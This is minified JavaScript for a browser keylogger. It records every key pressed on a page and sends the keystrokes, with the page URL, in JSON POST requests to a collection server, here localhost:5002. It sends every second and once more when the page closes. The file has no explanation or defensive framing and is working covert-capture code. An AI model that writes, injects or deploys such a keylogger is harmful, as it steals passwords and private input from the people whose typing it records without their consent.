var data={};var time=(new Date).getTime();data[time]="";var shouldSend=false;var lastLog=time;function sendingToServer(data){var xhr=new XMLHttpRequest;xhr.open("POST","http://localhost:5002/",true);xhr.setRequestHeader("Content-Type","application/json");xhr.send(JSON.stringify({url:document.URL,logs:data}))}
document.addEventListener('keydown', (e) => {log(e.key);});
function log(input){var now=(new Date).getTime();if(now-lastLog<10){return}data[time]+=input;shouldSend=true;lastLog=now}window.onbeforeunload=function(){data[time]+="[closed]";sendingToServer(data)};setInterval(function(){if(shouldSend){sendingToServer(data);shouldSend=false}delete data[time];time=(new Date).getTime();data[time]=""},1e3);